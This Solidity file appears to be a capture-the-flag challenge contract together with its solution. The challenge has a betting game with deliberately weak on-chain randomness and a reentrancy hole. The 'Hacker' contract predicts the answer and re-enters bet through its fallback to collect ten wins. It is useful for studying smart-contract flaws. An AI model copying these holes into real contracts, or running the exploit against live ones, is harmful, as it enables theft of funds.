// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.12;

contract Challenge {
    mapping(address => bool) public success;
    mapping(address => bool) public betted;
    mapping(address => uint) public win_counts;
    event SendFlag(address);

    constructor () {}

    function bet(bytes32 guess) public payable {
        require(! betted[msg.sender], "You have already tried this before.");
        bytes32 answer = keccak256(abi.encodePacked(blockhash(block.number), block.timestamp));
        require(answer == guess, "Bad luck.");
        win_counts[msg.sender] ++;
        (bool res,) = msg.sender.call{value: msg.value}("") ;
        require(res,"Message sender refuse to receive the reward.");
        betted[msg.sender] = true;
    }

    function checkwin() public payable {
        require(win_counts[msg.sender] >= 10, "Not enough wins .");
        success[msg.sender] = true;
        emit SendFlag(msg.sender);
    }
}

contract Hacker {
    Challenge c = Challenge(0x223f1caeb5ADE364350D56b7214260104Ac97dA2);
    bytes32 answer;
    uint256 cnt;
    
    function attack () external {
        answer = keccak256(abi.encodePacked(blockhash(block.number), block.timestamp));
        cnt ++ ; c.bet(answer);
        c.checkwin();
    }

    fallback () external {
        if (cnt < 10) {
            cnt ++ ; c.bet(answer);
        }
    }
}
